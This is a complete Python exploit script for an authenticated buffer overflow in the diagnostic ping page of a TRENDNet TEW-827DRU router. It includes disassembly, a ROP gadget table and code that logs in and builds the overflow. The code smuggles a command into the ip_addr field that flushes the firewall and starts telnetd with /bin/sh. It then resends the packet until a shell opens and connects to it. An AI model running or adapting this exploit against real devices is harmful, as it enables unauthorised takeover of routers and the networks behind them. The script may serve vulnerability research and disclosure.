#!/usr/bin/python3
"""
This script exercises an authenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect to
a reverse shell.

The vulnerability is a buffer overflow when processing an error message to inform the user about failing to resolve
the provided hostname. The string:

"echo \"ping: %s Unable to resolve, check that the name is correct" > %s"

is passed to sprintf. The first %s is filled with the value in 'ip_addr' field, the second is the static string
/tmp/diagnostic.

LOAD:00439604                 addiu   $v0, (aEchoPingSUnabl - 0x4C0000)  # "echo \"ping: %s Unable to resolve, chec"...
LOAD:00439608                 addiu   $v1, $fp, 0x258+var_224
LOAD:0043960C                 move    $a0, $v1         # s
LOAD:00439610                 move    $a1, $v0         # format
LOAD:00439614                 lw      $a2, 0x258+cp($fp)
LOAD:00439618                 la      $v0, aTDelay     # "t_delay"
LOAD:0043961C                 nop
LOAD:00439620                 addiu   $a3, $v0, (aTmpDiagnostic - 0x4C0000)  # "/tmp/diagnostic"
LOAD:00439624                 la      $v0, sprintf
LOAD:00439628                 nop
LOAD:0043962C                 move    $t9, $v0
LOAD:00439630                 jalr    $t9 ; sprintf
LOAD:00439634                 nop

The cgi file that contains the exploit was compiled with library randomization enabled meaning the exploit must be
repeatedly thrown until libuClibc gets loaded at the address used as the base in the exploit. Sometimes this is quick,
sometimes it takes a few minutes.

The ROP chain used in the exploit is shown below.
 - rop1 - This router has rather odd behavior, instead of using temporary 's' registers within the function it uses $v0
          and $v1 to move arguments around. Because of this the functions only save $fp and $ra which is kinda hard to
          make useful chains with one registers. The first rop gadget gives us control of $s0 - $s6 to give us a larger
          variety of ROPs available.
 - rop2 - The address of system ends in 0x20, ASCII for space, which we can't directly send in the URL. So, we replace
          the 0x20 with 0x1C and use this gadget to increment the address of system to the proper address.
 - rop3 - Grab a string off the stack and call system with it.

---------------------------------------------------------------
| Gadget Name | Gadget Offset | Gadget Summary                |
---------------------------------------------------------------
| rop1        | 0x0003E164    | lw      $ra, 0x40+var_4($sp)  |
|             |               | lw      $s6, 0x40+var_8($sp)  |
|             |               | lw      $s5, 0x40+var_C($sp)  |
|             |               | lw      $s4, 0x40+var_10($sp) |
|             |               | lw      $s3, 0x40+var_14($sp) |
|             |               | lw      $s2, 0x40+var_18($sp) |
|             |               | lw      $s1, 0x40+var_1C($sp) |
|             |               | lw      $s0, 0x40+var_20($sp) |
|             |               | jr      $ra                   |
|             |               | addiu   $sp, 0x40             |
---------------------------------------------------------------
| rop2        | 0x00053168    | addiu   $s3, 4                |
|             |               | move    $t9, $s5              |
|             |               | jalr    $t9                   |
|             |               | lw      $a0, 0($s3)           |
---------------------------------------------------------------
| rop3        | 0x0003CA64    | addiu   $a0, $sp, 0x70+var_48 |
|             |               | li      $a1, 1                |
|             |               | move    $t9, $s3              |
|             |               | jalr    $t9                   |
|             |               | move    $a2, $s5              |
---------------------------------------------------------------

The overflow is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import os
import mow
import base64
import signal
import requests
import argparse
import telnetlib


def ctrl_c_handler(_, __):
    """
    Handle ctrl-c so the program can exit.
    """
    os.kill(os.getpid(), 9)


def telnet_connect(host, port):
    """
    Connect to a telnet server.

    :param host: Host the telnet server is running on.
    :type host: str

    :param port: Listening port of the telnet server.
    :type port: int

    :return: Open telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def authenticate(host, port, username, password):
    """
    Create a session and authenticate with the target.

    :param host: Target IP address.
    :type host: str

    :param port: Port router is listening on.
    :type port: int

    :param username: Username for logging in.
    :type username: str

    :param password: Password for logging in.
    :type password: str

    :exception: Raised on failing to authenticate with the router.
    """
    username_b64 = base64.standard_b64encode(bytes(username, 'utf8'))
    password_b64 = base64.standard_b64encode(bytes(password, 'utf8'))

    data = {'html_response_page': '/login_pic.asp',
            'login_name': username_b64,
            'log_pass': password_b64,
            'action': 'do_graph_auth',
            'login_n': 'admin',
            'tmp_log_pass': '',
            'graph_code': '',
            'session_id': '12345'}

    request = requests.Session()
    response = request.post('http://%s:%d/apply_sec.cgi' % (host, port), data=data)
    if not response.ok:
        raise Exception('Failed to authenticate to host.')


def exploit_target(host, port, telnet_port, username, password):
    """
    Send the exploit to the target and connect to the reverse shell.

    :param host: Target IP address.
    :type host: str

    :param port: Target port.
    :type port: int

    :param telnet_port: Telnet port to open on the target.
    :type telnet_port: int

    :param username: Username used for authentication.
    :type username: str

    :param password: Password used for authentication.
    :type password: str
    """

    # Drop firewall rules to allow connecting to the telnet server. '|' is used because ';' and '&' are dropped when
    # present in the header.
    telnet_command = '`iptables -F|telnetd -l /bin/sh -p %d`' % telnet_port
    authenticate(host, port, username, password)

    rop1 = 0x3e164
    rop2 = 0x53168
    rop3 = 0x3ca64

    system = 0x57b1c

    overflow = mow.Overflow(0x228, 3, mow.LITTLE_ENDIAN, 0, 0x76fd5000, 'ping result: ')
    overflow.ra = rop1
    overflow.add_to_stack(0x3c, address=rop2)
    overflow.add_to_stack(0x34, address=rop3)
    overflow.add_to_stack(0x2c, address=system)
    overflow.add_to_stack(0x68, command=telnet_command.replace(' ', '${IFS}'))
    overflow_string = overflow.generate()

    data = {b'ccp_act': b'set',
            b'action': b'tools_diagnostic',
            b'method': b'0',
            b'ip_addr': overflow_string,
            b'pkt_size': b'64',
            b'cnt': b'4'}

    data = b'&'.join(b'%s=%s' % (key, value) for key, value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply.cgi', data=data)
    packet = request.create_packet()

    tn = telnet_connect(host, telnet_port)
    while tn is None:
        try:
            mow.send_packet(host, port, packet)
        except:
            continue
        tn = telnet_connect(host, telnet_port)

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Authenticated command injection exploit for TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int,
                        default=5555)
    parser.add_argument('-u', '--user', help='Username to login with', required=True)
    parser.add_argument('-P', '--password', help='Password to login with', required=True)

    args = parser.parse_args()

    signal.signal(signal.SIGINT, ctrl_c_handler)

    exploit_target(args.ip, args.port, args.tport, args.user, args.password)
